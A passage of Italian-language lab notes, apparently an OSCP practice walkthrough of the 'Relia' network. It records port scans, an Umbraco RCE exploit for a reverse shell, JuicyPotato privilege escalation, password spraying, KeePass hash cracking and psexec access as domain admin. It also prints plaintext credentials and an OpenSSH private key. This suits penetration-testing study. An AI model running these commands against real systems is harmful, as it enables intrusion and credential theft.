exiftool -a -u exemple.pdf
```

Ottengo cosi una serie di informazioni, tra due possibili username:

```bash
emma
zachary
```

Mi connetto tramite ftp alla port 14020:

```bash
ftp 192.168.166.247 14020
```

Trovo il pdf umbraco.pdf e al suo interno delle credenziali:

```bash
mark:OathDeeplyReprieve91
```

Visitando la pagina sulla porta 14080 trovo umbraco.

Utilizzo questo exploit (https://github.com/Jonoans/Umbraco-RCE) per ottenre una reverse-shell.

```bash
python exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -w 'http://web02.relia.com:14080/' -i 192.168.45.210
```

Ottengo la flag local.txt

Ho utilizzato powercat (https://github.com/rexpository/powercat-v2.0) per ottenre una shell migliore.

Utilizzo Juicy-P0tato per creare un utente amministratore (hacker:P@ssw0rd) sulla macchina:
- https://pentest.party/notes/windows/privilege-impersonate
- https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1

Accedo quindi tramite rdp alla macchina:

```bash
xfreerdp /cert-ignore /u:hacker /d:relia.com /p:"P@ssw0rd" /v:192.168.173.247
```

Ottengo così la flag proof.txt.
## 192.168.X.248 - EXTERNAL {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 192.168.X.248
```

```bash
Nmap scan report for 192.168.204.248 (192.168.204.248)
Host is up (0.040s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2024-05-11T16:18:41
|_Not valid after:  2024-11-10T16:18:41
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-20T10:57:01+00:00
|_ssl-date: 2024-05-20T10:57:11+00:00; -8s from scanner time.
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 21H2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -7s, deviation: 0s, median: -8s
| smb2-time: 
|   date: 2024-05-20T10:57:08
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.96 seconds

```

Visito la pagina 80:

![](/OSCP/Immagini_OSCP/Relia/248_port_80.png)

Provo a lanciare questo comando:

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.204.247/
```

E ottengo questo output:

```bash
/Admin                (Status: 302) [Size: 164] [--> http://192.168.204.248/Login?returnurl=%2fAdmin]
/admin                (Status: 302) [Size: 164] [--> http://192.168.204.248/Login?returnurl=%2fadmin]
/ADMIN                (Status: 302) [Size: 164] [--> http://192.168.204.248/Login?returnurl=%2fADMIN]
/favicon.ico          (Status: 200) [Size: 5430]
/home                 (Status: 301) [Size: 140] [--> http://192.168.204.248/]
/Home                 (Status: 301) [Size: 140] [--> http://192.168.204.248/]
/host                 (Status: 302) [Size: 183] [--> http://192.168.204.248/Host/ctl/Login/portalid/0?returnurl=%2fhost]
/Login                (Status: 200) [Size: 23091]
/login                (Status: 200) [Size: 23091]
/logoff               (Status: 302) [Size: 140] [--> http://192.168.204.248/]
/Privacy              (Status: 200) [Size: 33566]
/privacy              (Status: 200) [Size: 33566]
/register             (Status: 302) [Size: 167] [--> http://192.168.204.248/Login?returnurl=%2fregister]
/robots.txt           (Status: 200) [Size: 741]
/searchresults        (Status: 301) [Size: 154] [--> http://192.168.204.248/Search-Results]
/search-results       (Status: 200) [Size: 32372]
/terms                (Status: 200) [Size: 51543]
```

Sulla pagina http://192.168.204.248/privacy trovo l'email dell'utente emma:

```bash
emma@relia.com
```

Un'altra pagina interessante è la seguente;

![](/OSCP/Immagini_OSCP/Relia/248_port_80_search.png)

Lancio questo comando per scoprire se posso accedere su questa macchina:

```bash
sudo crackmapexec smb 192.168.173.248  -u users.txt -p passwords.txt -d relia.com --continue-on-success
```

Posso accedere con diverse credenziali, scelgo zachary:fireball.

Scopro che ci sono due share ai quali posso accedere. Enumero i due share tramite questo comando:

```bash
smbmap -H 192.168.173.248 -r transfer -u zachary -p fireball --depth 5

smbmap -H 192.168.173.248 -r users -u zachary -p fireball --depth 5
```

Ci sono diversi database keepass, provo ad estrarli tutti.

Solo da uno di questi riesco ad estrapolare la password tramite john:

```bash
keepass2john Database.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash 
```

Le credenziali estratte sono le seguenti:

```bash
User Name:Password
Michae321:12345
bo:Luigi=Papal1963
emma:SomersetVinyl1!
****:HabitsAgesEnd123
****:SAPassword_1998
****:welcome1
```

Accedo tramite rdp con le credenziali dell'utente emma appena trovate e trovo la flag local.txt:

```bash
xfreerdp /cert-ignore /u:emma /d:relia.com /p:"SomersetVinyl1\!" /v:192.168.173.248
```

Lanciando il comando:

```bash
dir env:
```

Trovo la password dell'utente mark (non l'avrei mai detto):

```bash
!8@aBRBYdb3!
```

Accedo tramite xfreerdp e trovo la flag proof.txt

```bash
xfreerdp /cert-ignore /u:mark /d:relia.com /p:"\!8@aBRBYdb3\!" /v:192.168.173.248
```

## 192.168.X.249 - LEGACY {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 192.168.X.249
```

```bash
Nmap scan report for 192.168.204.249 (192.168.204.249)
Host is up (0.038s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-20T10:58:00+00:00; -8s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-20T10:57:52+00:00
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2024-05-11T16:21:04
|_Not valid after:  2024-11-10T16:21:04
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.204.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=80%CT=1%CU=40400%PV=Y%DS=4%DC=I%G=Y%TM=664B
OS:2CC0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=4%ISR=107%TI=RD%TS=A)SEQ(SP=10
OS:6%GCD=1%ISR=10A%TI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=I%TS=A)OPS(O1=M551
OS:NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=
OS:M551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=
OS:Y%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(
OS:R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=6BD1%
OS:RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-20T10:57:55
|_  start_date: N/A
|_clock-skew: mean: -8s, deviation: 0s, median: -8s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Visito la pagina sulla porta 80:

![](/OSCP/Immagini_OSCP/Relia/249_port_80.png)

Provo a lanciare questo comando:

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.204.247/
```

E ottengo questo output:

```bash
/Admin                (Status: 302) [Size: 164] [--> http://192.168.204.248/Login?returnurl=%2fAdmin]
/admin                (Status: 302) [Size: 164] [--> http://192.168.204.248/Login?returnurl=%2fadmin]
/ADMIN                (Status: 302) [Size: 164] [--> http://192.168.204.248/Login?returnurl=%2fADMIN]
/favicon.ico          (Status: 200) [Size: 5430]
/home                 (Status: 301) [Size: 140] [--> http://192.168.204.248/]
/Home                 (Status: 301) [Size: 140] [--> http://192.168.204.248/]
/host                 (Status: 302) [Size: 183] [--> http://192.168.204.248/Host/ctl/Login/portalid/0?returnurl=%2fhost]
/Login                (Status: 200) [Size: 23091]
/login                (Status: 200) [Size: 23091]
/logoff               (Status: 302) [Size: 140] [--> http://192.168.204.248/]
/Privacy              (Status: 200) [Size: 33566]
/privacy              (Status: 200) [Size: 33566]
/register             (Status: 302) [Size: 167] [--> http://192.168.204.248/Login?returnurl=%2fregister]
/robots.txt           (Status: 200) [Size: 741]
/searchresults        (Status: 301) [Size: 154] [--> http://192.168.204.248/Search-Results]
/search-results       (Status: 200) [Size: 32372]
/terms                (Status: 200) [Size: 51543]
```

Visito anche la pagina /dashboard:

![](/OSCP/Immagini_OSCP/Relia/249_port_8000.png)

Probabilmente c'è la possibilità di fare privilage escalation sfruttando l'exploit su XAMPP for Windows 7.4.30. Vado avanti nel frattempo.

Visito la pagina /CMS:

![](/OSCP/Immagini_OSCP/Relia/249_port_8000_cms.png)

Facendo una rapida ricerca su google scopro che la versione utiizzata di RiteCMS è vulnerabile a RCE.

Trovo la pagina admin.php e riesco ad accedere con le credenziali admin:admin.

Poi seguo la guida di questo exploit: (https://www.exploit-db.com/exploits/50616).

![](/OSCP/Immagini_OSCP/Relia/249_local.png)

Utilizzo Juicy-P0tato per creare un utente amministratore (hacker:P@ssw0rd) sulla macchina:
- https://pentest.party/notes/windows/privilege-impersonate
- https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1

Accedo quindi tramite rdp alla macchina:

```bash
xfreerdp /cert-ignore /u:hacker /d:relia.com /p:"P@ssw0rd" /v:192.168.239.249
```

Ottengo così la flag proof.txt.

IMPORTANTE (info presa da discord): quando sulla macchina si trova git, quasi sempre c'è qualcosa di nascosto collegato ad esso:

Per verificare la presenza di git:

```bash
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Per verificare l presenza id repository git:

```bash
Get-ChildItem . -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Include ".git" -Recurse
```

I comandi successivi sono stati:

```bash
git log
```

con questo risultato:

```bash
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700

    V1
```

E questo:

```bash
git diff 8b430c17c16e6c0515e49c4eafdd129f719fde74 967fa71c359fffcbeb7e2b72b27a321612e3ad11
```

Ottenendo cosi le credenziali:

```bash
diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
new file mode 100644
index 0000000..77e370c
--- /dev/null
+++ b/htdocs/cms/data/email.conf.bak
@@ -0,0 +1,5 @@
+Email configuration of the CMS
+maildmz@relia.com:DPuBT9tGCBrTbR
+
+If something breaks contact jim@relia.com as he is responsible for the mail server.
+Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
```

```bash
maildmz@relia.com:DPuBT9tGCBrTbR
```



---
# INTERNAL

## 172.16.X.6 - DC02 {pwned:proof}

```bash
sudo nmap -sC -sV -O 172.16.156.6
```

```bash
Nmap scan report for 172.16.156.6 (172.16.156.6)
Host is up (0.022s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-26 14:45:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-26T14:45:59+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC02.relia.com
| Not valid before: 2024-05-11T16:06:44
|_Not valid after:  2024-11-10T16:06:44
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: DC02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-26T14:45:20+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:4a:ce (VMware)
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-26T14:45:19
|_  start_date: N/A
```

Accesso smb l'utente jim:

```bash
smbclient -N -L //172.16.156.6 -U relia.com/jim%Castello1\!
```

```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

Una volta trovate le credenziali del Domain Admin sulla macchina 21, utilizzo questo comando per accedere e collezionare tutte le flag presenti su questa macchina:

```bash
impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.165.6
```

## 172.16.X.7 - INTRANET {pwned:local&proof}

```bash
sudo nmap -sC -sV -O 172.16.156.7
```

```bash
Nmap scan report for 172.16.156.7 (172.16.156.7)
Host is up (0.022s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-generator: WordPress 6.0.3
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.156.7/wordpress/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.156.7/wordpress/
| tls-alpn: 
|_  http/1.1
|_http-generator: WordPress 6.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: INTRANET
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: INTRANET.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-26T14:47:07+00:00
|_ssl-date: 2024-05-26T14:47:47+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=INTRANET.relia.com
| Not valid before: 2024-05-11T16:17:06
|_Not valid after:  2024-11-10T16:17:06
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:58:fc (VMware)
| smb2-time: 
|   date: 2024-05-26T14:47:07
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Accesso smb con jim e dmzadmin.

Visito la porta 80, ma è molto lenta a caricare. Modifico il file /etc/hosts:

```bash
172.16.165.7 relia.com intranet.relia.com
```

Vengo reindirizzato alla pagina http://172.16.165.7/wordpress:

![](/OSCP/Immagini_OSCP/Relia/7_port_80.png)


Cliccando sul link relia intranet vengo reinderizzato alla intranet.

Lancio questo comando:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://172.16.165.7/wordpress/FUZZ
```

E ottengo questo risultato:

```bash
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2089ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 949ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 448ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 218ms]
wp-content              [Status: 301, Size: 352, Words: 22, Lines: 10, Duration: 76ms]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 9090ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1918ms]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1789ms]
wp-includes             [Status: 301, Size: 353, Words: 22, Lines: 10, Duration: 43ms]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3018ms]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 3240ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2867ms]
```

Ma niente di interessante.

Una volta trovate le credenziali del Domain Admin sulla macchina 21, utilizzo questo comando per accedere e collezionare tutte le flag presenti su questa macchina:

```bash
impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@172.16.165.7
```

## 172.16.X.14 - WK01 {pwned:local&proof}

Sono riuscito ad entrare su questa macchina tramite client-side attack (phishing) dalla macchina 192.168.x.189.

Qui ho trovato la flag local.txt all'interno della directory desktop dell'utente jim, con il quale sono loggato, e la flag proof.txt nella directory desktop dell'utente offsec.

Proseguo con l'enumeration sull'AD, partendo dagli utenti:

```bash
net user /domain
```

```bash
administrator
andrea
anna
brad
dan
Guest
iis_service
internaladmin
jenny
jim
krbtgt
larry                    
maildmz
michelle
milana                   
mountuser
```

I gruppi:

```bash
net group /domain
```

```bash
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*INTRANETRDP
*ITADMINS
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*WEBBYADMINS
*WKRDP
```

Info sul dominio corrente:

```bash
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

```bash
Forest                  : relia.com
DomainControllers       : {DC02.relia.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC02.relia.com
RidRoleOwner            : DC02.relia.com
InfrastructureRoleOwner : DC02.relia.com
Name                    : relia.com
```

Info sugli utenti:

```bash
Get-NetUser | select cn, userprincipalname                     
```

```bash
cn             userprincipalname      
--             -----------------
Administrator
Guest
krbtgt
mail test      maildmz@relia.com
Jim da Silva   jim@relia.com
Michelle Smith michelle@relia.com
Andrea Rossi   andrea@relia.com
mountuser      mountuser@relia.com
iis service    iis_service@relia.com
internaladmin  internaladmin@relia.com
Larry Johnson  larry@relia.com
Jenny Wilson   jenny@relia.com
Brad Jackson   brad@relia.com
Anna Santana   anna@relia.com
Dan Whitlock   dan@relia.com
Milana Bianchi milana@relia.com
```

Info sui computer nel dominio:

```bash
Get-NetComputer | select operatingsystem,dnshostname
```

```bash
operatingsystem              dnshostname       
---------------              -----------
Windows Server 2022 Standard DC02.relia.com
Windows Server 2022 Standard MAIL.relia.com
Windows Server 2022 Standard login.relia.com
Windows 11 Enterprise        WK01.relia.com
Windows 11 Enterprise        WK02.relia.com
Windows Server 2022 Standard INTRANET.relia.com
Windows Server 2022 Standard FILES.relia.com
Windows Server 2022 Standard WEBBY.relia.com
```

Domain shares:

```bash
Find-DomainShare -CheckShareAccess
```

```bash
Name           Type Remark              ComputerName  
----           ---- ------              ------------
ADMIN$   2147483648 Remote Admin        WK01.relia.com
C$       2147483648 Default share       WK01.relia.com
NETLOGON          0 Logon server share  DC02.relia.com
SYSVOL            0 Logon server share  DC02.relia.com
apps              0                     FILES.relia...
monit...          0                     FILES.relia...
scripts           0                     FILES.relia...
```

Girovagando tra le directory trovo il db C:\Users\jim\Documents\Database.kdbx e lo trasferisco sulla mia macchina tramite scp.

Utilizzando john riesco a ricavare la password per aprirlo:

```bash
keepass2john database.kdbx > Keepasshash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes1        (database)     
1g 0:00:00:00 DONE (2024-05-26 09:52) 16.66g/s 84800p/s 84800c/s 84800C/s andrade..elsalvador
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Qui trovo una serie di password:

```bash
dmzadmin:SlimGodhoodMope
jim:Castello1!
```

Faccio il tunneling della rete 172.16.156.0/24 tramite ligono-ng e lancio nmap su quest macchina:

```bash
sudo nmap -sC -sV -O 172.16.156.14
```

```bash
Nmap scan report for 172.16.156.14 (172.16.156.14)
Host is up (0.021s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-26T14:32:21+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=WK01.relia.com
| Not valid before: 2024-05-11T16:20:11
|_Not valid after:  2024-11-10T16:20:11
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK01
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK01.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-05-26T14:31:41+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-26T14:31:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
```

Provo a fare password sprying su tutta la rete:

![](/OSCP/Immagini_OSCP/Relia/14_password_sprying.png)

Una volta trovate le credenziali tramite enumeration sulla macchina 21, accedo in rdp:

```bash
xfreerdp /cert-ignore /u:john /d:relia.com /p:"YouWillNeverTakeMyTractor\!1922" /v:172.16.156.14
```

## 172.16.X.15 - WK02 {pwned:local&proof}

```bash
sudo nmap -sC -sV -O 172.16.156.15
```

```bash
Nmap scan report for 172.16.156.15 (172.16.156.15)
Host is up (0.032s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=WK02.relia.com
| Not valid before: 2024-05-11T16:20:33
|_Not valid after:  2024-11-10T16:20:33
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-05-26T14:33:59+00:00
|_ssl-date: 2024-05-26T14:34:38+00:00; +3s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

Host script results:
| smb2-time: 
|   date: 2024-05-26T14:33:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:de:84 (VMware)
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
```

Una volta trovate le credenziali tramite enumeration sulla macchina 21, accedo in rdp:

```bash
xfreerdp /cert-ignore /u:john /d:relia.com /p:"YouWillNeverTakeMyTractor\!1922" /v:172.16.156.15
```

IMPORTANTE: DURANTE L'ESERCITAZIONE HO RISCONTRATO DEI PROBLEMI AD ACCEDERE TRAMITE IL PRECEDENTE COMANDO. BISOGNA RIAVVIARE TUTTO!

Qui trovo le flag local (andrea) e proof (milana).

Nella directory C:\Users\milana\Documents trovo un altro database keepass. Lo trasferisco sulla mia macchina e provo a crackarlo.

Utilizzando john riesco a ricavare la password per aprirlo:

```bash
keepass2john database.kdbx > Keepasshash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
destiny1         (database)     
1g 0:00:00:00 DONE (2024-05-26 12:53) 33.33g/s 52800p/s 52800c/s 52800C/s joyce..danilo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.  
```

Qui dentro trovo la seguente credenziale:

```bash
sarah:placeholder
```

E una chiave privata openssh:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

## 172.16.X.19 {pwned:local&proof}

```bash
sudo nmap -sC -sV -O 172.16.156.19
```

```bash
Nmap scan report for 172.16.156.19 (172.16.156.19)
Host is up (0.023s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:d7:77:83:c6:48:69:ca:42:35:0e:62:c3:30:b7:b4 (RSA)
|   256 c7:62:4a:de:a5:b4:f1:2a:5a:f3:a1:d8:d3:96:1b:8d (ECDSA)
|_  256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
